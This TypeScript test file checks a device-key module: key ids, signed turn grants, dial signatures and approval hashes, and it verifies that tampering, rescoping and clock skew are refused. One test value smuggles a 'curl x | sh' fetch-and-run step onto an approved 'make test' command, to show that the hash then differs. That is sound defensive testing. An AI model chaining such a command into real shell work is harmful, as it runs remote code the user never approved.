import { DEVICE_CLOCK_SKEW_MS, DEVICE_GRANT_TTL_MS } from "@gram/contracts";
import { describe, expect, it } from "vitest";
import {
  approvalHash,
  deviceDialHolds,
  deviceIdOf,
  devicePrivateKeyFrom,
  devicePublicKeyFrom,
  generateDeviceKey,
  hashAccessToken,
  mintTurnGrant,
  sameHash,
  signDeviceDial,
  turnGrantHolds,
} from "./keys.ts";

const device = () => {
  const made = generateDeviceKey();
  return {
    ...made,
    key: devicePrivateKeyFrom(made.privateKeyPem),
    // What a verifier holds: the public half alone.
    public: devicePublicKeyFrom(made.publicKey)!,
  };
};

const to = { origin: "https://gram.example.com", workspace: "w1", thread: "t1" };
const NOW = 1_800_000_000_000;

describe("a device's key", () => {
  it("gives the device an id no other key has", () => {
    const a = device();
    const b = device();
    expect(a.deviceId).toMatch(/^d-[a-f0-9]{24}$/);
    expect(a.deviceId).toBe(deviceIdOf(a.publicKey));
    expect(a.deviceId).not.toBe(b.deviceId);
  });

  it("isn't read from anything that isn't a 32-byte Ed25519 key", () => {
    for (const text of ["", "abc", "A".repeat(42), "A".repeat(44), `${"A".repeat(42)}=`])
      expect(devicePublicKeyFrom(text), text).toBeUndefined();
  });
});

describe("a turn grant", () => {
  it("holds for its own thread until ten minutes after the person wrote", () => {
    const me = device();
    const grant = mintTurnGrant(me.key, to, NOW);
    expect(grant.grant.expiresAt - grant.grant.issuedAt).toBe(DEVICE_GRANT_TTL_MS);
    expect(turnGrantHolds(me.public, grant, to, NOW)).toBe(true);
    expect(turnGrantHolds(me.public, grant, to, NOW + DEVICE_GRANT_TTL_MS - 1)).toBe(true);
    expect(turnGrantHolds(me.public, grant, to, NOW + DEVICE_GRANT_TTL_MS)).toBe(false);
    expect(turnGrantHolds(me.public, grant, to, NOW - 1)).toBe(false);
  });

  it("is refused for another thread, workspace or server", () => {
    const me = device();
    const grant = mintTurnGrant(me.key, to, NOW);
    expect(turnGrantHolds(me.public, grant, { ...to, thread: "t2" }, NOW)).toBe(false);
    expect(turnGrantHolds(me.public, grant, { ...to, workspace: "w2" }, NOW)).toBe(false);
    expect(turnGrantHolds(me.public, grant, { ...to, origin: "https://x.example" }, NOW)).toBe(
      false,
    );
  });

  it("is refused when a server rewrites it to name another thread or to last longer", () => {
    const me = device();
    const signed = mintTurnGrant(me.key, to, NOW);
    const retargeted = { ...signed, grant: { ...signed.grant, thread: "t2" } };
    expect(turnGrantHolds(me.public, retargeted, { ...to, thread: "t2" }, NOW)).toBe(false);
    const stretched = {
      ...signed,
      grant: { ...signed.grant, expiresAt: signed.grant.expiresAt + 60 * 60_000 },
    };
    expect(turnGrantHolds(me.public, stretched, to, NOW + DEVICE_GRANT_TTL_MS + 1)).toBe(false);
    expect(turnGrantHolds(me.public, stretched, to, NOW)).toBe(false);
  });

  it("is refused when another key signed it, even a longer-lived one it signed itself", () => {
    const me = device();
    const other = device();
    expect(turnGrantHolds(me.public, mintTurnGrant(other.key, to, NOW), to, NOW)).toBe(false);
    const signed = mintTurnGrant(me.key, to, NOW);
    for (const signature of ["", "A".repeat(86), signed.signature.slice(0, 85), "!".repeat(86)])
      expect(turnGrantHolds(me.public, { ...signed, signature }, to, NOW), signature).toBe(false);
  });

  it("differs each time, so one message's grant isn't another's", () => {
    const me = device();
    expect(mintTurnGrant(me.key, to, NOW).grant.nonce).not.toBe(
      mintTurnGrant(me.key, to, NOW).grant.nonce,
    );
  });
});

const dialOf = (deviceId: string) => ({
  origin: "https://gram.example.com",
  path: "/device/connect",
  workspace: "w1",
  subject: "ada",
  deviceId,
  tokenHash: hashAccessToken("token-a"),
  time: NOW,
  nonce: "bm9uY2U",
});

describe("a dial", () => {
  it("holds for exactly what it signed", () => {
    const me = device();
    const dial = dialOf(me.deviceId);
    const signature = signDeviceDial(me.key, dial);
    expect(deviceDialHolds(me.public, dial, signature, NOW)).toBe(true);
    expect(deviceDialHolds(me.public, dial, signature, NOW + DEVICE_CLOCK_SKEW_MS)).toBe(true);
  });

  it("is refused with another person's token, another person, workspace or address", () => {
    const me = device();
    const dial = dialOf(me.deviceId);
    const signature = signDeviceDial(me.key, dial);
    for (const changed of [
      { ...dial, tokenHash: hashAccessToken("token-b") },
      { ...dial, subject: "bo" },
      { ...dial, workspace: "w2" },
      { ...dial, origin: "https://gram.example.org" },
      { ...dial, path: "/host/connect" },
      { ...dial, nonce: "b3RoZXI" },
      { ...dial, time: NOW + 1 },
    ])
      expect(deviceDialHolds(me.public, changed, signature, NOW)).toBe(false);
  });

  it("is refused outside the clock's allowance, and from another key", () => {
    const me = device();
    const dial = dialOf(me.deviceId);
    const signature = signDeviceDial(me.key, dial);
    expect(deviceDialHolds(me.public, dial, signature, NOW + DEVICE_CLOCK_SKEW_MS + 1)).toBe(false);
    expect(deviceDialHolds(me.public, dial, signature, NOW - DEVICE_CLOCK_SKEW_MS - 1)).toBe(false);
    expect(deviceDialHolds(device().public, dial, signature, NOW)).toBe(false);
  });
});

describe("an approval's hash", () => {
  const shown = {
    origin: "https://gram.example.com",
    workspace: "w1",
    requestId: "r1",
    kind: "exec" as const,
    folder: "/home/ada/code/app",
    target: "/home/ada/code/app",
    command: "make test",
    timeoutMs: 120_000,
  };

  it("matches only what was shown", () => {
    const hash = approvalHash(shown);
    expect(hash).toMatch(/^[a-f0-9]{64}$/);
    expect(sameHash(hash, approvalHash({ ...shown }))).toBe(true);
    expect(sameHash(hash, approvalHash({ ...shown, command: "make test; curl x | sh" }))).toBe(
      false,
    );
    expect(sameHash(hash, approvalHash({ ...shown, target: "/home/ada/code/app/vendor" }))).toBe(
      false,
    );
    expect(sameHash(hash, "")).toBe(false);
  });
});
